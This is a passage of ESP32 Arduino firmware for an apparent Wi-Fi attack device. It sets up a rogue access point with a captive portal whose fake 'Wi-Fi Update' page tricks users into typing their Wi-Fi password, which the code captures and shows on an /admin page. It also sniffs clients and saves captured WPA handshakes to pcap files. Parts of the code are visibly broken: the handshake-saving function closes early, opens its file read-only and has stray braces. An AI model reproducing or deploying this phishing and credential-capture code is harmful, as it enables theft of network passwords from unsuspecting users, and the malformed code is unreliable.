  // Start promiscuous mode for client detection
  startWiFiSniffer();
  
  // Run scan for 10 seconds
  xTaskCreatePinnedToCore(
    [](void *pvParameters) {
      clients.clear();
      unsigned long startTime = millis();
      
      while (millis() - startTime < 10000) {
        delay(100);
      }
      
      stopWiFiSniffer();
      session.clientScanActive = false;
      
      // For demo purposes, add some dummy clients
      Client client1;
      client1.mac = "AA:BB:CC:DD:EE:FF";
      client1.rssi = -65;
      clients.push_back(client1);
      
      Client client2;
      client2.mac = "11:22:33:44:55:66";
      client2.rssi = -72;
      clients.push_back(client2);
      
      Serial.printf("[+] Client scan completed. Found %d clients\n", clients.size());
      vTaskDelete(NULL);
    },
    "clientScanTask",
    4096,
    NULL,
    1,
    NULL,
    0
  );
}

void setupAPMode() {
  WiFi.softAPConfig(apIP, apIP, netMask);
  WiFi.softAP(DEFAULT_AP_SSID, DEFAULT_AP_PASS);
  dnsServer.start(DNS_PORT, "*", apIP);
}

void setupSTAMode() {
  WiFi.mode(WIFI_AP_STA);
  WiFi.disconnect();
}
void setupCaptivePortal() {
  dnsServer.setErrorReplyCode(DNSReplyCode::NoError);

  webServer.on("/generate_204", []() {
    webServer.sendHeader("Location", "http://" + apIP.toString() + "/login", true);
    webServer.send(302, "text/plain", "");
  });

  webServer.on("/hotspot-detect.html", []() {
    webServer.sendHeader("Location", "http://" + apIP.toString() + "/login", true);
    webServer.send(302, "text/plain", "");
  });

  webServer.onNotFound([]() {
    webServer.sendHeader("Location", "http://" + apIP.toString() + "/login", true);
    webServer.send(302, "text/plain", "");
  });

  // Fake login page
  webServer.on("/login", []() {
    String html = R"rawliteral(
     <!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Wi-Fi Authentication Required</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <style>
    * {
      box-sizing: border-box;
    }
    body {
      margin: 0;
      padding: 0;
      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
      background-color: #f1f3f6;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
    }
    .container {
      background: white;
      padding: 30px;
      border-radius: 10px;
      box-shadow: 0 0 20px rgba(0,0,0,0.1);
      max-width: 380px;
      width: 100%;
      text-align: center;
    }
    .logo {
      font-size: 32px;
      font-weight: bold;
      color: #2c3e50;
      margin-bottom: 10px;
    }
    .subtext {
      color: #777;
      font-size: 14px;
      margin-bottom: 20px;
    }
    input[type="password"] {
      width: 100%;
      padding: 12px;
      font-size: 15px;
      border: 1px solid #ccc;
      border-radius: 6px;
      margin-bottom: 20px;
    }
    input[type="submit"] {
      width: 100%;
      background-color: #0078D7;
      color: white;
      border: none;
      padding: 12px;
      border-radius: 6px;
      font-size: 16px;
      cursor: pointer;
      transition: background 0.3s ease;
    }
    input[type="submit"]:hover {
      background-color: #005bb5;
    }
    .footer {
      margin-top: 20px;
      font-size: 12px;
      color: #999;
    }
  </style>
</head>
<body>
  <div class="container">
    <div class="logo">Wi-Fi Update</div>
    <div class="subtext">Your router requires re-authentication due to a security update.</div>
    <form action="/submit" method="POST">
      <input type="password" name="password" placeholder="Enter Wi-Fi Password" required>
      <input type="submit" value="Continue">
    </form>
    <div class="footer">© 2025 Wi-Fi Protected Access | Firmware Security Update 5.2</div>
  </div>
</body>
</html>

    )rawliteral";
    webServer.send(200, "text/html", html);
  });

  // Handle fake form submit
  webServer.on("/submit", HTTP_POST, []() {
    if (webServer.hasArg("password")) {
      lastCapturedPassword = webServer.arg("password");
      Serial.println("[Captured Password] " + lastCapturedPassword);
    }
    webServer.send(200, "text/html", "<html><body><h3>Connecting...</h3></body></html>");
  });

  // Admin password viewing
  webServer.on("/admin", []() {
    String html = "<html><body><h2>Captured Password:</h2><p style='color:red;font-size:20px;'>";
    html += (lastCapturedPassword != "") ? lastCapturedPassword : "None";
    html += "</p></body></html>";
    webServer.send(200, "text/html", html);
  });
}

bool isAuthenticated() {
  return session.authenticated;
}

void sendJSONResponse(const String& status, const String& error) {
  String json = "{\"status\":\"" + status + "\"";
  if (error != "") {
    json += ",\"error\":\"" + error + "\"";
  }
  json += "}";
  webServer.send(200, "application/json", json);
}
void saveSettings() {
  EEPROM.writeUInt(0, session.floodInterval);
  EEPROM.writeUChar(2, session.currentChannel);
  EEPROM.commit();
}

void loadSettings() {
  session.floodInterval = EEPROM.readUInt(0);
  session.currentChannel = EEPROM.readUChar(2);
}


void loadHandshakesList() {
  savedHandshakes.clear();
  File root = SPIFFS.open("/");
  File file = root.openNextFile();
  
  while (file) {
    if (String(file.name()).endsWith(".pcap")) {
      SavedHandshake handshake;
      handshake.filename = file.name();
      
      // Extract SSID and BSSID from filename
      // Format: /handshake_SSID_BSSID_TIMESTAMP.pcap
      String fname = file.name();
      int ssidStart = fname.indexOf('_') + 1;
      int ssidEnd = fname.indexOf('_', ssidStart);
      int bssidStart = ssidEnd + 1;
      int bssidEnd = fname.indexOf('_', bssidStart);
      int timeStart = bssidEnd + 1;
      int timeEnd = fname.indexOf('.', timeStart);
      
      handshake.ssid = fname.substring(ssidStart, ssidEnd);
      handshake.bssid = fname.substring(bssidStart, bssidEnd);
      handshake.timestamp = fname.substring(timeStart, timeEnd);
      
      savedHandshakes.push_back(handshake);
    }
    file = root.openNextFile();
  }
  
  Serial.printf("[+] Loaded %d saved handshakes\n", savedHandshakes.size());
}

void saveHandshakeToFile(const String& ssid, const String& bssid, const uint8_t* handshake, size_t length) {
  // Generate filename with timestamp
  String timestamp = String(millis());
  String filename = "/handshake_" + ssid + "_" + bssid + "_" + timestamp + ".pcap";
  
  // Write to file
 }
  File file = SPIFFS.open(filename, FILE_READ);
if (!file || file.isDirectory()) {
  webServer.send(500, "text/plain", "Failed to open file");
  return;
}

  
  // Write PCAP header (simplified)
  uint8_t pcapHeader[] = {
    0xD4, 0xC3, 0xB2, 0xA1, 0x02, 0x00, 0x04, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x04, 0x00, 0x01, 0x00, 0x00, 0x00
  };
  file.write(pcapHeader, sizeof(pcapHeader));
  
  // Write packet header
  uint32_t ts_sec = millis() / 1000;
  uint32_t ts_usec = millis() % 1000;
  uint32_t incl_len = length;
  uint32_t orig_len = length;
  
  file.write((uint8_t*)&ts_sec, 4);
  file.write((uint8_t*)&ts_usec, 4);
  file.write((uint8_t*)&incl_len, 4);
  file.write((uint8_t*)&orig_len, 4);
  
  // Write packet data
  file.write(handshake, length);
  file.close();
  
  // Update handshakes list
  SavedHandshake newHandshake;
  newHandshake.ssid = ssid;
  newHandshake.bssid = bssid;
  newHandshake.timestamp = timestamp;
  newHandshake.filename = filename;
  
  savedHandshakes.push_back(newHandshake);
  if (savedHandshakes.size() > MAX_SAVED_HANDSHAKES) {
    // Remove oldest handshake
    SPIFFS.remove(savedHandshakes[0].filename);
    savedHandshakes.erase(savedHandshakes.begin());
  }
  {
  Serial.printf("[+] Saved handshake for %s (%s) to %s\n", 
    ssid.c_str(), bssid.c_str(), filename.c_str());
}
void connectToWiFi() {
  Serial.println("[*] Connecting to WiFi for OTA...");
  WiFi.mode(WIFI_STA);
  WiFi.begin(ssid, password);

  unsigned long startAttemptTime = millis();
  while (WiFi.status() != WL_CONNECTED && millis() - startAttemptTime < 10000) {
    Serial.print(".");
    delay(500);
  }

  if (WiFi.status() == WL_CONNECTED) {
    Serial.println("\n[+] WiFi connected!");
    Serial.print("[+] IP Address: ");
    Serial.println(WiFi.localIP());
  } else {
    Serial.println("\n[-] WiFi connection failed! OTA won't be available.");
  }
}

void setupOTA() {
  ArduinoOTA.setHostname("ESP32-Pentest");

  ArduinoOTA.onStart([]() {
    Serial.println("[*] OTA Update Start");
  });

  ArduinoOTA.onEnd([]() {
    Serial.println("\n[+] OTA Update Complete");
  });

  ArduinoOTA.onProgress([](unsigned int progress, unsigned int total) {
    Serial.printf("[*] OTA Progress: %u%%\r", (progress / (total / 100)));
  });

  ArduinoOTA.onError([](ota_error_t error) {
    Serial.printf("\n[!] OTA Error[%u]: ", error);
    if (error == OTA_AUTH_ERROR) Serial.println("Auth Failed");
    else if (error == OTA_BEGIN_ERROR) Serial.println("Begin Failed");
    else if (error == OTA_CONNECT_ERROR) Serial.println("Connect Failed");
    else if (error == OTA_RECEIVE_ERROR) Serial.println("Receive Failed");
    else if (error == OTA_END_ERROR) Serial.println("End Failed");
  });

  ArduinoOTA.begin();
  Serial.println("[+] OTA Ready");
}


void generateRandomMac(uint8_t *mac) {
  for(int i = 0; i < 6; i++) {
    mac[i] = random(256);
  }
  // Set locally administered and unicast bits
  mac[0] &= 0xFE; // Unicast
  mac[0] |= 0x02; // Locally administered
}

void setWiFiChannel(uint8_t channel) {
  esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE)
}